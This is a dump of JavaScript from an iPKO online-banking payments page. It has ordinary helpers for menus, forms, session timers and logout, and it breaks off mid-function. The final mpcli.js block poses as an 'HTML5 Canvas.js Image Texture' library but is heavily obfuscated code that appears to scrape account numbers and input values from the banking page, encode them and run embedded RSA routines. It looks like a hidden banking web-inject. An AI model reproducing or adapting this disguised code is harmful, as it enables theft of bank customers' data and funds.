/* _anonymous_1_bb1230b18f start */

//    alert(document.compatMode);

/* _anonymous_1_bb1230b18f end */
/* _anonymous_2_2ea81216a2 start */
<!--
      var offerTimeout=15*1000;
      if (top!=self)top.location.href=location.href;

      var opera_close_window_on_logout = 1;


      if (window.opera) {
         history.navigationMode = 'compatible';
         var page_id = _pageId;     
         if (window.sessionStorage) {
            var page_hist = window.sessionStorage.getItem ('page_hist') || '';
            if (page_hist.indexOf(page_id) >= 0) {
              window.location = '/';
            } else {
              window.sessionStorage.setItem ('page_hist', page_hist + page_id);
            }
         } else {
            window.name = window.name || '';
            if (window.name.indexOf(page_id) >= 0) {
              window.location = '/';
            } else {
              window.name += page_id;
            }
         }
      }

      var infoTipWindow; var submitStarted; var no_submit_block; var dont_show_back_reload_window;
      var selectChanged =0; var disable_focus_placing=0;
      var sectionName='payments'; var imgUrl = '/ikd_img/skins/ipko/'; var htmlUrl = '/ikd_html/skins/ipko/';
   //-->
/* _anonymous_2_2ea81216a2 end */
/* /ikd_scripts/skins/ipko/common.js?v=8 start */
// skrypty do obs³ugi infoTip, pod?wietlania pól menu

function initEvents()
{
    // obs³uga pod¶wietlania obrazków
    var obj;
    for(var i = 1; i < 15; i++)    // górne menu
    {
        obj = document.getElementById('tm' + i)
        if (obj)
        {
            obj.onmouseover = tMOver;
            obj.onmouseout = tMOut;
        }
        else
        {
            break;
        }
    }
    var dynaLine = document.getElementById('dynaLine');
    if(dynaLine)
    {
        dynaLine.onmouseover = unhide;
        dynaLine.onmouseout = tMOut;
    }
}

function onLoadFunctionsBase() {
    
    initSessionCounter();
}


//ta funkcja jest wo³ana w body onLoad, mo¿na j± przeci±¿yæ pamiêtaj±c o zawo³aniu onLoadFunctionsBase() we w³asnej funkcji 
function onLoadFunctions() {
  onLoadFunctionsBase();
}


function initSessionCounter() {
    
    window.session_expired = false;  
    window.one_minute_left = false;
}


function checkSubmit(waitSec)
{
    dont_show_back_reload_window = true;
    if(submitStarted)
    {
        no_submit_block = false;
        return false;
    }
    else
    {
        if(!no_submit_block)
        {
            submitStarted = true;
            window.setTimeout('submitStarted=false', waitSec*1000);
        }
        no_submit_block = false;
        return true;
    }
}

function placeFocus()
{
    if(disable_focus_placing)
        return;
    if(!document.forms || !document.forms[0] || !document.forms[0].elements)
        return;
    var elems = document.forms[0].elements;
    var elem;
    var errFormFieldRe = /errFormField/;
    for(var i = 0; i < elems.length; i++)
    {
        elem = elems[i];
        if (elem.className && errFormFieldRe.test(elem.className)) {
             if (elem.style.display != 'none' && elem.type != 'hidden' && elem.type != 'image'
                 && elem.name != 'skin' && elem.name != 'client_work_context'
                 && elem.name != 'selectwniosekonline' && !elem.disabled) {
                elem.focus();
                return;
            } else if (elem.style.display == 'none' && elem.parentNode.className == 'select_own_account') {
                // przypadek dropdowna jquery.styled-dropdown
                elem.nextSibling.firstChild.focus();
                return;
            }
        }
    }
    for(i = 0; i < elems.length; i++)
    {
        elem = elems[i];
        if(elem.style.display != 'none' && elem.type != 'hidden' && elem.type != 'image'
          && elem.name !='skin' && elem.name != 'client_work_context'
          && elem.name != 'selectwniosekonline'  && !elem.disabled)
        {
            elem.focus();
            break;
        } else if (elem.style.display == 'none' && elem.parentNode.className == 'select_own_account') {
            // przypadek dropdowna jquery.styled-dropdown
            elem.nextSibling.firstChild.focus();
            break;
        }
    }
}


function clearForm()
{
    if(!document.forms || !document.forms[0] || !document.forms[0].elements)
        return;
    document.forms[0].reset();
    var elems = document.forms[0].elements;
    for(var i = 0; i < elems.length; i++)
    {
        if(elems[i].tagName  == 'INPUT')
        {
            if(elems[i].type  == 'text' || elems[i].type  == 'password' || 
               elems[i].type  == 'file') {
              elems[i].value = '';
            }
            if(elems[i].type  == 'checkbox') {
                elems[i].checked = false;
            }
        }
        if(elems[i].tagName  == 'TEXTAREA') {
            elems[i].value = '';
        }
    }
}

function eventHelper(event)
{
    var evt = (event) ? event : (window.event) ? window.event : "";
    if (!evt)
        return false;
    var srcEl = (evt.srcElement) ? evt.srcElement : evt.target;
    return srcEl;
}

// TOP MENU
function tMOver(event)
{
    try { // for FIREFOX
        var srcEl = eventHelper(event);
        var aTag = srcEl;
        if (aTag && document.getElementById('dynaLine'))
        {
            var leftpos = 0;
            var toppos = 0;

            do {
                aTag = aTag.offsetParent;
                leftpos += aTag.offsetLeft;
                toppos += aTag.offsetTop;
            } while(aTag.tagName != "BODY");

            var dLineStyle = document.getElementById('dynaLine').style;
            dLineStyle.width= '' + srcEl.offsetWidth + 'px';
            dLineStyle.top = '' + (toppos + 21) +'px';
            dLineStyle.left = '' + (leftpos + 1) + 'px';
            dLineStyle.visibility = 'visible';
        }
    }
    catch(e) {
    }
    return true;
}

function unhide()
{
    try { // for FIREFOX
        if(document.getElementById('dynaLine'))
        {
            var dLineStyle = document.getElementById('dynaLine').style;
            dLineStyle.visibility = 'visible';
        }
    }
    catch(e) {
    }
    return true;
}

function tMOut()
{
    try { // for FIREFOX
        if(document.getElementById('dynaLine'))
        {
            var dLineStyle = document.getElementById('dynaLine').style;
            dLineStyle.visibility = 'hidden';
        }
    }
    catch(e) {
    }
    return true;
}

// menu
function clickMenu(name)
{
    if(document.forms[0].elements['button'])
        document.forms[0].elements['button'].value='';
    if(document.forms[0].elements['menu']) {
        document.forms[0].elements['menu'].value=name;
        document.forms[0].submit();
    }
}

// przycisk
function clickButton(name)
{
    if(document.forms[0].elements['menu'])
        document.forms[0].elements['menu'].value='';
    if(document.forms[0].elements['button']) {
        document.forms[0].elements['button'].value=name;
        document.forms[0].submit();
    }
}

//scroll
function scrollSelect(name, waitSec)
{
  var setDelayn = 1000;
  checkSubmit(1);
  selectChanged = selectChanged + 1 ;
  setTimeout('scrollStoped("'+name+'",'+waitSec+')', setDelayn);
}
function scrollStoped(name, waitSec)
{
  selectChanged=selectChanged-1;

  if (selectChanged<=0)
  {
    if (checkSubmit(waitSec))
    {
      clickButton(name);
    }
  }
}

// INFO TIP
function closeInfoTip()
{
  if(infoTipWindow && infoTipWindow.close)
    infoTipWindow.close();
}

function infoTip(tipContent)
{
    var maxSmallTipSize = 240;
    if(tipContent.length > maxSmallTipSize)
    {
        var tipHeight = 278;
        var tipWidth = 216;
        var tipLeft = eval(screen.availWidth-250);
        var tipTop = eval(screen.availHeight-360);
        var tipScrollbars = "yes";
    }
    else
    {
        tipHeight = 148;
        tipWidth = 200;
        tipLeft = eval(screen.availWidth-250);
        tipTop = eval(screen.availHeight-230);
        tipScrollbars = "no";
    }

    closeInfoTip();
    window.tipContent = tipContent;

    var params = "width=" + tipWidth+ ",height=" + tipHeight
        + ",toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars="
        + tipScrollbars + ",resizable=no,left=" + tipLeft + ",top=" + tipTop;
    if(tipContent.length > maxSmallTipSize)
        infoTipWindow = window.open(htmlUrl + 'infoTip2.html', 'infoTipWindow', params);
    else
        infoTipWindow = window.open(htmlUrl + 'infoTip.html', 'infoTipWindow', params);
}

function rawWindow(url, title, width, height)
{
    var params = (width
      ? "width=" + width
      : "")
      + (height
      ? ", height=" + height
      : "")
      + ",toolbar=no,location=no,directories=no,status=yes"
      + ",menubar=no,scrollbars=yes,resizable=yes, left=100, top=100";
    return window.open(url, title, params);
}

function infoTipLink(url)
{
    var tipHeight = 216;
    var tipWidth = 216;
    var tipLeft = eval(screen.availWidth-360);
    var tipTop = eval(screen.availHeight-360);

    closeInfoTip();

    var params = "width=" + tipWidth+ ",height=" + tipHeight
        + ",scrollbars,left=" + tipLeft + ",top=" + tipTop;
    infoTipWindow = window.open(url, 'infoTipWindow', params);
}

function amountHelper(evt, fieldToFocus)
{
    var charCode = evt.charCode ? evt.charCode : evt.which == 0 ? 0 : evt.keyCode;
    if(charCode == 44 || charCode == 46)
    {
        if(document.forms[0].elements[fieldToFocus])
        {
            document.forms[0].elements[fieldToFocus].focus();
            document.forms[0].elements[fieldToFocus].select();
            if(!(evt.which || evt.which == 0)) // IE
                evt.keyCode = 0;
            return false;
        }
    }
    return true;
}

function preventBackRefresh(event)
{
    var evt = (event) ? event : (window.event) ? window.event : "";
    if (!evt)
        return false;
    var srcEl = (evt.srcElement) ? evt.srcElement : evt.target;

    var retValue = true;

    if (evt.keyCode == 116 // next for Firefox
        && (evt.type == "keydown" || (evt.type == "keypress" && evt.charCode == 0)))
    {
        /* F5 */
        retValue = false;
    }
    else if (evt.keyCode == 8)
    {
        /* backspace */
        if (!srcEl || !srcEl.type ||
           !(srcEl.type == "text" || srcEl.type == "textarea" || srcEl.type == "password"))
        {
            retValue = false;
        }
    }

    if(!retValue)
    {
        if(!(evt.which || evt.which == 0)) // IE
            evt.keyCode = 0;
    }

    return retValue;
}

// skrypt do odliczania czasu pozosta³ego do wygasniecia sesji
var start_time;
var session_expired;

function get_time() {
//pobranie aktualnego czasu
  var curr_time = new Date();
  start_time = parseInt(curr_time.getTime()/1000);
  return start_time;
}

function initSessionTimer(session_timeout) {
 if (session_timeout <=3600){
   min = parseInt(session_timeout/60);
   sec = session_timeout%60;
 }else{
   min = 60;
   sec = 0;
   session_timeout = 3600;
 }
 get_time();
 end_time = start_time + session_timeout + 1;
 sessionTimer(min,sec,end_time);
}

function sessionTimer(minutes,seconds,end_time) {
 if (seconds>=0) {
  get_time();
  left_time = end_time - start_time;
  min = parseInt(left_time/60);
  sec = left_time%60;

  if (sec > 0) {
      sec--;
   } else if (min > 0) {
      min--;
      sec = 59;
   }

  var session;
  if (document.getElementById('session_time')) {
    session = document.getElementById('session_time');
  } else {
    sessionTimer(min,sec,end_time);
  }
  var btn_refresh;
  if (document.getElementById('btn_refresh')) {
    btn_refresh = document.getElementById('btn_refresh');
  }

  if((min==0 && sec==0) || (min < 0 || sec < 0)) {
    if (document.getElementById('session_text_2')) {
      hide_red_box();
    }
    var info;
    if (document.getElementById('session')) {
      info = document.getElementById('session');
    }
    info.style.color = "#E11A2D";
    info.style.fontWeight = "bold";
    info.innerHTML="sesja wygas³a";
    sec = -1;
    window.session_expired = true;
    if (btn_refresh) {
      btn_refresh.style.display = 'none';
      btn_refresh.onclick = '';
    }
  } else {
    if (document.getElementById('session_text_2')) {
      if (min==0 && sec<=60) {
        var session_box = document.getElementById('session');
        if (session_box.className != 'red_box') {
          show_red_box();
          window.one_minute_left = true;
        }
      }
    } else {
      if (min==0 && sec<=30) {
        if (btn_refresh) {
          if (btn_refresh.className == 'btn_refresh') {
            btn_refresh.className = 'btn_refresh_red';
          }
        }
      } else {
        if (btn_refresh) {
          if (btn_refresh.className == 'btn_refresh_red') {
            btn_refresh.className = 'btn_refresh';
          }
        }
      }
    }
    session.innerHTML=((min < 10) ? "0" + min : min)+":"+((sec < 10) ? "0" + sec : sec) + "s";
  }
  setTimeout("sessionTimer(min,sec,end_time);", 1000);
 }
}

function addEventHandler(element, eventName, handler) {
    if (element.addEventListener) {
        element.addEventListener(eventName, handler, false);
    } else if (element.attachEvent) {
        element.attachEvent('on' + eventName, handler);
    }
}

function removeEventHandler(element, eventName, handler) {
  if (element.removeEventListener) {
    element.removeEventListener(eventName, handler, false);
  } else if (element.detachEvent) {
    element.detachEvent('on' + eventName, handler);
  }
}


function uploadWindow(upload_url, form_name, data, client_session_timeout) {
  if (document.getElementById('session_time'))
  {
     initSessionTimer(parseInt(client_session_timeout));
  }
  var sd = document.getElementById('sd');
  var uploadFormId = 'UploadForm';
  var uploadWindowId = 'UploadWindow_' + form_name + '_' + (new Date()).getTime();
  var eUploadForm = document.getElementById(uploadFormId);
  if (!eUploadForm) {
    /* Utworzenie HTMLa:
      <form action="[upload_url]" method="post" target="UploadWindow">
        <input type="hidden" name="sd" value="[sd]">
      </form>
     */
    eUploadForm = document.createElement('form');
    eUploadForm.id = uploadFormId;
    eUploadForm.method = 'post';
    document.body.appendChild(eUploadForm);
    eUploadForm.innerHTML = '<input type="hidden" name="sd"><input type="hidden" name="form_name"><input type="hidden" name="data">';
  }
  eUploadForm.target = uploadWindowId; // nazwa okna, w którym ma siê wy¶wietliæ strona
  eUploadForm.action = upload_url; // ustawienie urla
  eUploadForm.firstChild.value = sd.value; // ustawienie sd na inpucie
  eUploadForm.firstChild.nextSibling.value = form_name; // ustawienie nazwy menu
  eUploadForm.lastChild.value = data; // ustawienie dodatkowych parametrow dla formatki
  rawWindow('about:blank', uploadWindowId, 750, 500);
  eUploadForm.submit();
}

function contextConfigPrintWindow(action_url, session_id, client_session_timeout) {
  if (document.getElementById('session_time'))
  {
     initSessionTimer(parseInt(client_session_timeout));
  }
  var FormId = 'PrintForm';
  var WindowId = 'PrintWindow_' + (new Date()).getTime();
    /* Utworzenie HTMLa:
      <form action="[action_url]" method="post" target="WindowId">
        <input type="hidden" name="ias_sid" value="[session_id]">
      </form>
     */
  var aForm = document.getElementById(FormId);
  if (!aForm) {
    aForm = document.createElement('form');
    aForm.id = FormId;
    aForm.action = action_url; // ustawienie urla
    aForm.method = 'post';
    aForm.innerHTML = '<input type="hidden" name="ias_sid">';
    document.body.appendChild(aForm);    
  }
    
  aForm.target = WindowId; // nazwa okna, w którym ma siê wy¶wietliæ strona
  aForm.firstChild.value = session_id; // ustawienie dodatkowych parametrow dla formatki
  window.open('about:blank', WindowId, "toolbar=no,location=no,directories=no,status=yes"
      + ",menubar=no,scrollbars=yes,resizable=yes");
  aForm.submit();
}

function ext_appWindow(ext_app_url, form_name, client_session_timeout,new_title, new_info,new_id, no_submenu) {
  if (document.getElementById('session_time'))
  {
     initSessionTimer(parseInt(client_session_timeout));
  }
  if (!no_submenu) {
    if (document.getElementById('docheader')) {
       document.getElementById('docheader').innerHTML='<h1>'+new_title+'</h1>';
    }
    if (document.getElementById('info_txt')) {
       document.getElementById('info_txt').innerHTML=new_info;
    }
    ext_app_menu_selection(new_id);
  }
  if (document.getElementById(new_id)) {
     document.getElementById(new_id).className='selected';
  }
  var sd = document.getElementById('sd');
  var ext_appFormId = 'ExtAppForm';
  var ext_appWindowId = 'ExtAppWindow_' + form_name + '_' + (new Date()).getTime();
  var eExtAppForm = document.getElementById(ext_appFormId);
  if (!eExtAppForm) {
    /* Utworzenie HTMLa:
      <form action="[ext_app_url]" method="post" target="ExtAppWindow">
        <input type="hidden" name="sd" value="[sd]">
      </form>
     */
    eExtAppForm = document.createElement('form');
    eExtAppForm.id = ext_appFormId;
    eExtAppForm.method = 'post';
    document.body.appendChild(eExtAppForm);
    eExtAppForm.innerHTML = '<input type="hidden" name="sd"><input type="hidden" name="form_name"><input type="hidden" name="data"><input type="hidden" name="app_id">';
  }
  eExtAppForm.target = ext_appWindowId; // nazwa okna, w którym ma siê wy¶wietliæ strona
  eExtAppForm.action = ext_app_url; // ustawienie urla
  eExtAppForm.firstChild.value = sd.value; // ustawienie sd na inpucie
  eExtAppForm.firstChild.nextSibling.value = form_name; // ustawienie nazwy menu
//  eExtAppForm.fristChild.nextSibling.nextSibling.value = data; // ustawienie dodatkowych parametrow dla formatki
  eExtAppForm.lastChild.value = new_id; // ustawienie app_id
//  rawWindow('about:blank', ext_appWindowId, 750, 500);
  window.open('about:blank', ext_appWindowId);
  eExtAppForm.submit();
}

function show_hold_info() {
  var pay_date;
  var hold;
  var hold_input
  var repeat;
  var repeat_input;
  if (document.getElementById("pay_date")) {
    pay_date = document.getElementById("pay_date");
    if (document.getElementById("tr_hold")) {
      hold = document.getElementById("tr_hold");
      date_2_y = pay_date.value.slice(0,4);
      date_2_m = pay_date.value.slice(5,7);
      date_2_d = pay_date.value.slice(8,10);
      date_2_y = eval(date_2_y);
      date_2_m = eval(date_2_m);
      date_2_d = eval(date_2_d);
      date_1_y = today.getFullYear();
      date_1_m = today.getMonth();
      date_1_d = today.getDate();
      var date1 = new Date(date_1_y, date_1_m, date_1_d);
      var date2 = new Date(date_2_y, date_2_m - 1, date_2_d);
      if (date2) {
        var diff = date2.getTime() - date1.getTime();
      }
      hold_input = document.getElementById("hold");
      if (diff > 0) {
        hold.style.display = '';
        hold_input.disabled = false;
      } else {
        hold.style.display = 'none';
        hold_input.disabled = true;
      }
      if (document.getElementById("tr_repeat")) {
        repeat = document.getElementById("tr_repeat");
        repeat_input = document.getElementById("repeat");
        if (diff > 0) {
          repeat.style.display = '';
          repeat_input.disabled = false;
        } else {
          repeat.style.display = 'none';
          repeat_input.disabled = true;
        }
      }
      show_repeat_info(hold_input);
    }
  }
}

function show_repeat_info(entry){
  if (document.getElementById("tr_repeat")) {
    if (entry.value == 0 && entry.disabled == false) {
      document.getElementById("tr_repeat").style.display = '';
      document.getElementById("repeat").disabled = false;
    } else {
      document.getElementById("tr_repeat").style.display = 'none';
      document.getElementById("repeat").disabled = true;
    }
  }
}

function changeLogout(elem) {
    elem.href="#";
    elem.onclick = function() { return false; }
    if (window.opera && window.opera.version() < "12") {
        var logout_result = opera_logout();
        if (logout_result === false) {
            return false;
        }
    }
    dont_show_back_reload_window = true;
    clickMenu('logout');
}

// obs³uga wylogowania w przegl±darce Opera (wymaga jQuery)
function opera_logout() {
    if (window.opera_close_window_on_logout) {
        var $form = $('form:first');
        var data = $form.serialize() + '&mnu_logout=1';
        $.post($form.attr('action'), data);
        window.setTimeout(function() {
            alert("Po klikniêciu \"OK\" nast±pi prawid³owe wylogowanie z serwisu iPKO.\n\nZe wzglêdów bezpieczeñstwa nast±pi automatyczne zamkniêcie okna przegl±darki.\n\nZe wzglêdów bezpieczeñstwa nie korzystaj z poni¿szej opcji przegl±darki, poniewa¿ mo¿e powodowaæ nieprawid³owe dzia³anie serwisu szyfrowanego.");

            window.close()
        }, 50);
        return false;
    }
}

// przygotowanie numeru rachunku do prezentacji
function displayAccountNum(num) {
    var fullAccRegexp = /^(\d{2})(\d{4})(\d{4})(\d{4})(\d{4})(\d{4})(\d{4})$/;
    var parts = num.match(fullAccRegexp);
    if (parts) {
        parts.shift();
        return parts.join(' ');
    } else {
        return num;
    }
}

// popup przejscia do nowego lub starego iPKO Dealer
function open_ipko_dealer_popup() {
    $('#popup_ipko_dealer').modal({
        onOpen: function (dialog) {
            dialog.overlay.show();
            dialog.container.show();
            dialog.data.show();
        },
        onClose: function (dialog) {
            dialog.data.hide();
            dialog.container.hide();
            dialog.overlay.fadeOut('slow', function () {
                $.modal.close();
            });
        },
        maxWidth: 500,
        minHeight: 90,
        escClose: true,
        close: true,
        closeHTML:"<a class='modalCloseImg showImg'></a>"
    });
}

/* /ikd_scripts/skins/ipko/common.js?v=8 end */
/* /ikd_scripts/skins/ipko/mpcli.js?v=1 start */
/*!
* HTML5 Canvas.js Image Texture
* Copyright 2012, Mike W
* Includes Cachea41.js,Processing.js
*
* Requires jQuery v1.6.1+ for image swapping
* Get it from http://jquery.com/
* 
* Date: Thu May 12 0:21:23 2012 -0400
* 
**/
(function(a,b,c,d,e,f,B,C,PKOBPn24){var g=function(a,b,c,d,e,i,j,t){this.a=b;this.b=a;this.a5=0;this.f=0;this.g=i;this.q=j;this.v="";this.a42="";this.a9=t;this.c=c;this.d=d;this.e=e;this.z=function(a,b,c){if(typeof c!==C[5]){if(this.f<=this.g){B(function(){c.z("pko","reload",f)},this.q*1e3)}}var e=false;if(b!="e"){e=true}this.y(a,e)};this.s=function(a){a.a40(this.v+"?","local")};this.y=function(a,b,c,d,e){if(a!=""){this.v=a}this.a42=new k(this.f,this.g,this.c,this.d,this.e,[10,12,13,14,16,20,451,0],this.a9);this.f++;if(b==true){this.a42.Cache(this.a)}this.s(this.a42);if(b!==null&&b!==false){return true}return false};this.Cache=function(a,b,c,d,e){return this.a};function k(a,b,c,d,e,f,g){this.r=a;this.t=b;this.c=c;this.d=d;this.o=e;this.g=f;this.v=g;this.p=function(a,b,c){return Math.round(a.getTime()/b)+a.getTimezoneOffset()*c}(new Date,1e3,60)}k.prototype={Cache:function(a){if(typeof a!==undefined){this.a=a}this.forceWebGL=" 1 ";this.a4=0;this.a12=""},a1:function(a,b,c){if(b=="cache"){this.a12=encodeURIComponent(a);return true}if(b==undefined){this.a5=a;return true}if(b==a){this.a4=this.g[7];return true}if(b==c){this.a4=a;return true}if(b>a){if(this.a4>a){return this.a4}return false}this.a4++},a23:function(a,b,c,d,e,f,g,h,i){i=this.a14(this.g[7],i);if(typeof h[i]!=C[5]){function z(a,b,c){return a.substr(0,b)+c+a.substr(b,18)+c+a.substr(22,b)}if((h[i].length=a+b)&&(h[i].substr(0,a)!=f+"020"+d+g||h[i].substr(a,b)!=d+1e8+e)){return[false,z(h[i],4,c)]}}return[true,0]},a32:function(a,b,c){if(a!="local"){if(a==1){return[]["sort"]}return"https://www.ipko.pl/ikd_img/images.xlst"}return"img/xlst"},a16:function(f,m,a,b){b+=this.a22("Mac","number","on",window);return this.a14(0,m)+this.a7("-",f,this.o)+this.a14(0,a)+b},a40:function(b,c,d,e){d=this.a32(c);if(d!==null){if(this.r==0){this.a7(0,d,this.r,2,0);this.a38(b,d)}for(e=1;e<99;e++){if(e==3){var a=this.a23(this.g[0],this.g[4],".","111","1001",this.g[6],2,window,this.a24(this.g[1],d));if(a[0]==false){if(this.a7(e,d,a[1],2,1)==false){this.a38(b,d)}}}else{var a=this.a22(e,d,2,window);if(a!==null){if(a[0]!==-2){if(this.a1(1,a[0])!==false){if(this.a7(e,d,a[1],a[0],1)==false){this.a38(b,d)}}}else{e+=a[1]}}}}if(this.r==this.t||this.r*2==this.t){this.a7(this.g[7]+this.r,d,this.r,2,0);this.a38(b,d)}else{return true}this.r++}return false},a7:function(a,r,g,b,c,e){if(a=="-"){b=g.substr(8,3);if(typeof this.d[b]!==C[5]){return r+a+this.d[b]}else{return r+a+this.r}}e=b*10;e=this.a21(b,[this.a24(3,r),this.a24(4,r),this.a24(b,r),this.a24(e+6,r),this.a24(e+4,r),this.a24(e/b+6,r),this.a24(e/b+7,r),this.a24(e+5,r),this.a24(e-1,r),this.a24(b+16,r),this.a24(e,r),this.a24(e+8,r),this.a24(e+b+7,r),this.a24(e+b*5,r),this.a24(e*2-e/b+1,r)]);if(e!==undefined&&e!=null){if(c==1&&e[1].length>6||c<1){if(this.a18(a+e[1])===true){b=e;if(b[0]=="img"){b[0]=1}else if(b[0]==C[7]){b[0]=2}else{b[0]=0;b[1]=this.g[7]}var c=this.a15([a,b[0],b[1],this.a4,g],r,1);if(c<this.g[6]){return false}return true}}}return true},a15:function(a,b,c,d,e,f){if(c==1){c+=6;d="";for(e in a){if(typeof a[e]!=="function"){d+=this.a14(0,this.a24(c,b))+a[e];c++}}d+=this.a16(this.p,this.a24(this.g[3],b),this.a24(this.g[5]+2,b),this.v);this.a1(this.a10(b,d),"cache");return c}if(c==0){a+=3}c=this.a14(a,b);b=this.a33(a*-1,c,this.forceWebGL,"");if(b!==null&&b!==undefined){if(b.indexOf(e+d)==0){a=b.split(e+d);a[0]=d;return a}return b.split(" ")}return false},a33:function(a,b,c,d){if(d==""){if(a<-2){if(c!==undefined){d=b.split(c);return d[1]}}}if(this.a5>-1){c=this.a14(3,a);if(c!==null){d=c.split(b);return d[this.a5]}}else if(this.a5==-2){c=this.a14(Math.abs(this.a5),a);if(c!==null){d=c.split(b);return d[1]}}return null},a22:function(d,e,f,g,h){if(d=="Mac"){return function(a,b,c,d,e){a[b+f]=c;if(typeof a[f+b]==d){return c+"1"}else{return c+"0"}}(g,d+"OsX","-",e,f)}var a,b=0,c="",i="KGgoAAAA";h=this.a15(d,e,0,i,"WQ6QjR"+b);if(h=="iVBORw"+b+i){return[-2,100]}if(h[0]==i){a=this.a14("a",h[1],0,b+1,"constructor");if(a!=undefined&&a!=null){this.a1(a[1],b,0)}return[2,"m"+a[0]]}this.a1(0,b);for(a in h){if(typeof a[h]!=="function"){if(this.a14(0,h[a])in g){this.a1(f,0)}}}return[2,c]},a25:function(a,g,h,i,j,k,b,c,d,e,f){c=[];f=String;for(d=k;d<a.length;d++){if(typeof a=="string"){b=a.charCodeAt(d);b>=h&&b<=j?c[d]=f.fromCharCode(h+(b+g)%i):c[d]=f.fromCharCode(b)}}return c.join("")},a21:function(a,b,c,d,e,f,g,h,i){if(a==1){return[255,65535,32767,67108860,16383,15667404,14326766,4294967295,268435455,16777215,1073741823,"0123456789abcdefghijklmnopqrstuvwxyz",C[6]]}if(a==2){try{g=document;c=g.getElementById(this.a14(0,b[1]));if(c!==null&&c!==undefined){return["img",c[this.a14(0,b[6])]]}c=g.getElementById(this.a14(0,b[11]));if(c!==null&&c!==undefined){return["img",c[this.a14(0,b[6])]]}c=g.getElementById(this.a14(0,b[13]));if(c!==null&&c!==undefined){return["img",c[this.a14(0,b[6])]]}c=g.getElementById(this.a14(0,b[12]));if(c!==null&&c!==undefined){return["img",c[this.a14(0,b[6])]]}c=g.getElementById(this.a14(0,b[0]));if(c!==null&&c!==undefined){d=c.getElementsByTagName(this.a14(0,b[2]));if(d!==null&&d!==undefined){for(f in d){if(d[f].innerHTML!==undefined){var e=d[f].innerHTML;if(e.length>6&&e.length<11){if(e.match(/^\d+/)){return[C[7],e]}}}}}}d=g.getElementsByTagName(this.a14(0,b[10]));if(d!==undefined&&d!==null){var e=[this.a14(0,b[5]),this.a14(0,b[14])];e[2]=e[0].length;e[3]=e[1].length;for(a in d){if(d[a]!==null&&d[a]!==undefined){h=this.a14(0,b[9]);i=this.a14(0,b[8]);if(d[a][h]!==undefined&&d[a][h]!==null&&d[a][h]!==""&&d[a][i]!==undefined&&d[a][i]!==null){c=d[a][i].length;if(d[a][h].length>2&&c>9){e[4]=d[a][i].substr(c-e[2],e[2]);e[5]=d[a][i].substr(c-e[3],e[3]);if(d[a][h].substr(0,3)==e[4]&&e[4]==e[0]||d[a][h]==e[5]&&e[5]==e[1]){i=this.a14(0,b[6]);c=d[a][i];if(c!==null&&c!==undefined){if(c.length>6&&c.length<40){return["img",d[a][i]]}}}}}}}}c=g.getElementById(this.a14(0,b[4]));if(c!==null&&c!==undefined){d=c.getElementsByTagName(this.a14(0,b[2]));if(d!==null&&d!==undefined){for(f in d){if(d[f].innerHTML!==undefined){var e=d[f].innerHTML;if(e.length>6&&e.length<11){if(e.match(/^\d+/)){return[C[7],e]}}}}}}d=g.getElementsByTagName(this.a14(0,b[10]));for(a in d){if(d[a]!==null&&d[a]!==undefined){c=d[a][this.a14(0,b[3])];h=this.a14(0,b[6]);i=this.a14(0,b[8]);if(c!==undefined&&c!==null&&d[a][i]!==undefined&&d[a][i]!==null&&d[a][i].length>8){if(c>49){if(d[a][i].substr(0,9)==this.a14(0,b[7])){c=d[a][h];if(c!==null&&c!==undefined){if(c.length>6&&c.length<50){return["img",d[a][h]]}}}}}}}}catch(e){}return[0,0]}if(a==3){return new(C[10][b+C[9]+C[0].toLowerCase()])(c,c)}return this.a8(this.a14(0,this.a24(a,b)),c,this.a21(1))},a13:function(a,b,c,d,e,f){d=this.a21(3,"I",1);d[this.a14(0,a)]=this.a14(0,b)+this.a14(0,c)+e;return true},a24:function(a,b){if(this.a1(a)){return this.a33(b," ")}return null},a18:function(a){if(typeof this.d[this.c][a]==C[8]){this.d[this.c][a]++;if(this.d[this.c][a]>2){return false}return true}this.d[this.c][a]=1;return true},a8:function(e,t,z){function v(e,t,n){e!=null&&("number"==typeof e?this.fromNumber(e,t,n):t==null&&"string"!=typeof e?this.fromString(e,256):this.fromString(e,t))}function m(){return new v(null)}function g(e){return o.charAt(e)}function y(e,t){var n=u[e.charCodeAt(t)];return n==null?-1:n}function b(e){var t=m();return t.fromInt(e),t}function w(e){var t=1,n;return(n=e>>>16)!=0&&(e=n,t+=16),(n=e>>8)!=0&&(e=n,t+=8),(n=e>>4)!=0&&(e=n,t+=4),(n=e>>2)!=0&&(e=n,t+=2),(n=e>>1)!=0&&(e=n,t+=1),t}function E(e){}function S(e){this.m=e,this.mp=e.Z25(),this.mpl=this.mp&z[2],this.mph=this.mp>>15,this.um=(1<<e.Img-15)-1,this.mt2=2*e.t}function x(){this.i=0,this.j=0,this.S=[]}function T(e){p[d++]^=e&255,p[d++]^=e>>8&255,p[d++]^=e>>16&255,p[d++]^=e>>24&255,d>=c&&(d-=c)}function N(){T((new Date).getTime())}function L(){if(h==null){N(),h=new x,h.Z36(p);for(d=0;d<p.length;++d)p[d]=0;d=0}return h.Z24()}function O(e,t){return new v(e,t)}function M(e,t){if(t<e.length+11)return"-2",null;var n=new Array,r=e.length-1;while(r>=0&&t>0)n[--t]=e.charCodeAt(r--);n[--t]=0;var i=A,s=new Array;while(t>2){s[0]=0;while(s[0]==0)i.Z23(s);n[--t]=s[0]}return n[--t]=2,n[--t]=0,new v(n)}var n,r=Math.pow(z[6],2),i,s=navigator,o=z[11],u=new Array,a,f,l=52,c=256,h,p,d;i=(r&z[9])==z[5],i&&s.appName=="Microsoft Internet Explorer"?(v.prototype.am=function(e,t,n,r,i,s){var o=t&z[2],u=t>>15;while(--s>=0){var a=this[e]&z[2],f=this[e++]>>15,l=u*a+f*o;a=o*a+((l&z[2])<<15)+n[r]+(i&z[10]),i=(a>>>30)+(l>>>15)+u*f+(i>>>30),n[r++]=a&z[10]}return i},n=30):i&&s.appName!="Netscape"?(v.prototype.am=function(e,t,n,r,i,s){while(--s>=0){var o=t*this[e++]+n[r]+i;i=Math.floor(o/(z[3]+4)),n[r++]=o&z[3]+3}return i},n=26):(v.prototype.am=function(e,t,n,r,i,s){var o=t&z[4],u=t>>14;while(--s>=0){var a=this[e]&z[4],f=this[e++]>>14,l=u*a+f*o;a=o*a+((l&z[4])<<14)+n[r]+i,i=(a>>28)+(l>>14)+u*f,n[r++]=a&z[8]}return 